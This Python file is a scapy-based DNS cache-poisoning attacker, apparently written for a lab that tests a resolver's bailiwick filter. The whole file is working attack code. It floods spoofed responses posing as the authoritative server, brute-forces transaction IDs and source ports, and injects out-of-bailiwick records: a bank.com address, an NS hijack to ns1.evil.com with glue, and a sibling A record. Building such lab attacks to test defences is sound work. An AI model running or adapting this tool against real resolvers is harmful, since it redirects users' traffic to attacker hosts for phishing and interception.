"""OoB poisoning attacker.

This blind attacker floods spoofed DNS responses to the resolver while pretending
to come from the legitimate authoritative server. It exercises three Out-of-
Bailiwick injection vectors so the lab can demonstrate that R3 (bailiwick filter)
must reject *every* OoB record, not just the most obvious one:

  1. Additional-section "bank.com -> 6.6.6.6" (classic OoB cache poisoning).
  2. Additional-section NS hijack ("example.net IN NS ns1.evil.com" with glue),
     attempting to redirect the parent zone to attacker-controlled NS.
  3. Authority-section sibling poisoning ("evilbank.com IN A POISON_IP") which
     tests whether the resolver is greedy when it sees AUTHORITY records.

Mode selection via $ATTACK_PROFILE:
  - "default" / unset: only vector (1).
  - "multi": vectors (1)+(2)+(3) packed into a single packet so the attacker has
    a single race window to land all three at once.
"""

from __future__ import annotations

import os
import time
from typing import Iterable, List, Sequence

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send  # type: ignore

RESOLVER_IP = os.getenv("RESOLVER_IP", "10.20.0.53")
AUTH_IP = os.getenv("AUTH_IP", "10.20.0.100")
RESOLVER_UPSTREAM_PORT = int(os.getenv("RESOLVER_UPSTREAM_PORT", "33333"))
TXID_SPACE = max(1, min(65536, int(os.getenv("TXID_SPACE", "65536"))))
TXID_SCAN_LIMIT = max(1, min(TXID_SPACE, int(os.getenv("TXID_SCAN_LIMIT", str(TXID_SPACE)))))
SRC_PORT_START = os.getenv("SRC_PORT_START")
SRC_PORT_END = os.getenv("SRC_PORT_END")
SRC_PORT_SCAN_LIMIT = os.getenv("SRC_PORT_SCAN_LIMIT")
PACKET_CHUNK_SIZE = max(1, int(os.getenv("PACKET_CHUNK_SIZE", "512")))
ATTACK_RATE = float(os.getenv("ATTACK_RATE", "0.03"))
ATTACK_PROFILE = os.getenv("ATTACK_PROFILE", "default").strip().lower()

QNAME = "victim.example.net."
POISON_DOMAIN = "bank.com."
POISON_IP = os.getenv("POISON_IP", "6.6.6.6")
LEGIT_EXAMPLE_IP = "198.51.100.10"

# Auxiliary OoB vectors used in "multi" profile.
NS_HIJACK_DOMAIN = "example.net."
NS_HIJACK_NS = "ns1.evil.com."
NS_HIJACK_GLUE_IP = "7.7.7.7"
SIBLING_DOMAIN = "evilbank.com."


def _build_dns(txid: int) -> DNS:
    if ATTACK_PROFILE == "multi":
        return DNS(
            id=txid,
            qr=1,
            aa=1,
            rd=1,
            qd=DNSQR(qname=QNAME, qtype="A"),
            an=DNSRR(rrname=QNAME, type="A", ttl=60, rdata=LEGIT_EXAMPLE_IP),
            # Authority hijack: attempt to overwrite NS for parent zone.
            ns=DNSRR(rrname=NS_HIJACK_DOMAIN, type="NS", ttl=300, rdata=NS_HIJACK_NS),
            ar=[
                DNSRR(rrname=POISON_DOMAIN, type="A", ttl=300, rdata=POISON_IP),
                DNSRR(rrname=NS_HIJACK_NS, type="A", ttl=300, rdata=NS_HIJACK_GLUE_IP),
                DNSRR(rrname=SIBLING_DOMAIN, type="A", ttl=300, rdata=POISON_IP),
            ],
            ancount=1,
            nscount=1,
            arcount=3,
        )

    # Default profile: minimal OoB injection (paper's classic vector).
    return DNS(
        id=txid,
        qr=1,
        aa=1,
        rd=1,
        qd=DNSQR(qname=QNAME, qtype="A"),
        an=DNSRR(rrname=QNAME, type="A", ttl=60, rdata=LEGIT_EXAMPLE_IP),
        ar=DNSRR(rrname=POISON_DOMAIN, type="A", ttl=300, rdata=POISON_IP),
        ancount=1,
        arcount=1,
    )


def _clamp_port(value: int) -> int:
    return max(1, min(65535, value))


def source_port_candidates() -> range:
    if SRC_PORT_START is None and SRC_PORT_END is None and SRC_PORT_SCAN_LIMIT is None:
        port = _clamp_port(RESOLVER_UPSTREAM_PORT)
        return range(port, port + 1)

    start = _clamp_port(int(SRC_PORT_START or RESOLVER_UPSTREAM_PORT))
    end = _clamp_port(int(SRC_PORT_END or start))
    if end < start:
        start, end = end, start

    total = end - start + 1
    limit = max(1, min(total, int(SRC_PORT_SCAN_LIMIT or total)))
    return range(start, start + limit)


def batched_packets(txids: Sequence[int], ports: Iterable[int]) -> Iterable[List]:
    chunk = []
    for dport in ports:
        for txid in txids:
            chunk.append(build_packet(txid, dport))
            if len(chunk) >= PACKET_CHUNK_SIZE:
                yield chunk
                chunk = []
    if chunk:
        yield chunk


def build_packet(txid: int, dport: int):
    return (
        IP(src=AUTH_IP, dst=RESOLVER_IP)
        / UDP(sport=53, dport=dport)
        / _build_dns(txid)
    )


def main() -> None:
    txids = range(TXID_SCAN_LIMIT)
    ports = source_port_candidates()
    candidate_count = len(txids) * len(ports)
    print(
        f"[*] OoB flood: profile={ATTACK_PROFILE} txid_space={TXID_SPACE} "
        f"txid_scan={TXID_SCAN_LIMIT} src_ports={ports.start}-{ports.stop - 1} "
        f"candidates_per_cycle={candidate_count} chunk={PACKET_CHUNK_SIZE} "
        f"rate={ATTACK_RATE}s -> resolver={RESOLVER_IP}"
    )

    while True:
        for packets in batched_packets(txids, ports):
            send(packets, verbose=0)
        time.sleep(ATTACK_RATE)


if __name__ == "__main__":
    main()
